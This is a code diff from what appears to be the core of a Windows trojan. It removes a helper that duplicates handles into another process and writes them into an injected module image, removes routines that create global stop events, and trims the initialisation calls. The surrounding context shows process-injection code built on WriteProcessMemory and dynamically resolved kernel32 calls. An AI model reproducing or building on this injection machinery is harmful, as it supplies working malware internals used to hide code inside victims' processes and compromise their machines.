@@ -94,30 +94,6 @@ static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *da
 	return (CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, data, dataSize, NULL) == FALSE) ? false : true;
 }
 
-/*
-  Copy the handle to the module in another process.
-
-  IN process - process to modify.
-  IN image   - the address of the module in the process.
-  IN curVa   - current VA data to be copied.
-  IN handle  - handle to copy.
-
-  Return     - true - in case of success,
-               false - in case of error.
-*/
-static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE handle)
-{
-	HANDLE newHandle;
-	DWORD_PTR rva = (DWORD_PTR)(((LPBYTE)curVa) - ((LPBYTE)coreData.modules.current));
-
-	if(CWA(kernel32, DuplicateHandle)(CURRENT_PROCESS, handle, process, &newHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) != FALSE)
-	{
-		if(CWA(kernel32, WriteProcessMemory)(process, (LPBYTE)image + rva, &newHandle, sizeof(HANDLE), NULL) != FALSE)return true;
-		CWA(kernel32, DuplicateHandle)(process, newHandle, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
-	}
-	return false;
-}
-
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 // Core.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -186,32 +162,6 @@ static bool __inline initOsBasic(DWORD flags)
   }
   
   return true;
-}
-
-/*
-  Creating objects.
-
-  IN flags - flags INITF_*.
-
-  Return   - true - in case of success,
-             false - in case of error.
-*/
-static bool __inline initHandles(DWORD flags)
-{
-	//Global objects.
-	if((flags & Core::INITF_INJECT_START) == 0)
-	{
-		coreData.globalHandles.stopEvent   = CWA(kernel32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, NULL);
-		coreData.globalHandles.stopedEvent = CURRENT_PROCESS;
-
-		if(coreData.globalHandles.stopEvent == NULL)
-		{
-			WDEBUG0(WDDT_ERROR, "Failed to create global handles.");
-			return false;
-		}
-	}
-
-	return true;
 }
 
 /*
@@ -369,9 +319,6 @@ bool Core::init(DWORD flags)
   //Basic OS data.
   if(!initOsBasic(flags))return false;
 
-  //Objects.
-  if(!initHandles(flags))return false;
-
   //Current user's data.
   if(!initUserData(flags))return false;
 
@@ -381,9 +328,6 @@ bool Core::init(DWORD flags)
   //PID
   coreData.pid = CWA(kernel32,GetCurrentProcessId)();
 
-  //Nulling UserAgent.
-  coreData.httpUserAgent = NULL;
-  
   //Set the process rights.
   if(!initProcessRights(flags))return false;
 
@@ -470,26 +414,6 @@ void *Core::initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFla
   }
 	{
 		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.modules.current.");
-	}
-
-  //coreData.globalHandles.stopEvent.
-  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopEvent, coreData.globalHandles.stopEvent))
-  {
-    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopEvent.");
-    errorsCount++;
-  }
-	{
-		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.globalHandles.stopEvent.");
-	}
-
-  //coreData.globalHandles.stopedEvent.
-  if(!copyHandleToProcess(process, image, &coreData.globalHandles.stopedEvent, coreData.globalHandles.stopedEvent))
-  {
-    WDEBUG0(WDDT_ERROR, "Failed coreData.globalHandles.stopedEvent.");
-    errorsCount++;
-  }
-	{
-		WDEBUG0(WDDT_INFO, "OK: copyDataToProcess:coreData.globalHandles.stopedEvent.");
 	}
 
   //Error outputs.
